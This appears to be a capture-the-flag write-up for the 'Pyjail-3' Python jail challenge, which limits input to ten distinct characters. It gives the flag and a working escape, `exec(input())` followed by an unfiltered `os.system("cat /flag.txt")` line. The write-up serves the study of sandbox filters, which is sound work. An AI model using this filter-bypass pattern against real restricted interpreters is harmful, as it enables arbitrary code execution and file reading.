---
title: "Pyjail-3"
ctf: "Pwny-CTF"
category: "misc"
difficulty: "Not specified"
points: 200
techniques: ["jail-escape", "pyjail"]
tools: ["netcat", "python"]
keywords: ["Pyjail-3", "Pwny-CTF", "misc", "jail-escape", "pyjail", "netcat", "python"]
status: "solved"
has_script: true
source: "Pwny-CTF/CHALLENGES/Python-Jails/Pyjail-3/notes.md"
---

# Pyjail-3 (Pwny-CTF, misc)

## Summary
Challenge **Pyjail-3** from the Pwny-CTF CTF, misc category. Main technique: jail-escape. The flag: sigpwny{a_very_unique_exploit}

## Statement and artefacts
nc chal.sigpwny.com 5014

Author: Pete

**Provided files / artifacts:**
- `work/Dockerfile (file, 292 B)`
- `work/handout-3.zip (archive, 866 B)`
- `work/info.txt (text, 717 B)`

## Recognition signals
- Signal: The final payload is too varied to fit into 10 distinct characters — but the constraint only concerns the 1st line.

## Resolution method
1. Read filter → ≤ 10 unique characters in input.
2. Payload (`work/solve.py`): `exec(input())` → unique characters: `e x c ( i n p u t )` = exactly 10, it passes. `input()` reads a **second** line, and `exec` executes it without any limit.
3. 2nd line sent: `import os; os.system("cat /flag.txt")` → flag.

1. **Flaw (source)**

```python
def is_bad(user_input):
    return len(set(user_input)) > 10   # at most 10 DISTINCT characters
...
exec(user_input)
```
The final payload is too varied to fit into 10 distinct characters — but the constraint only concerns the **1st** line.

## Solve script
Script path: [scripts/solve.py](scripts/solve.py)

## Flag
sigpwny{a_very_unique_exploit}

## Lessons and reusable patterns
- Indirection by input(): exec(input()) transfers the real payload to a following line which escapes the original filter. Classic for any constraint on the size/variety of the 1st entry.
- Count distinct characters (set), not length: exec(input()) is right on the limit.
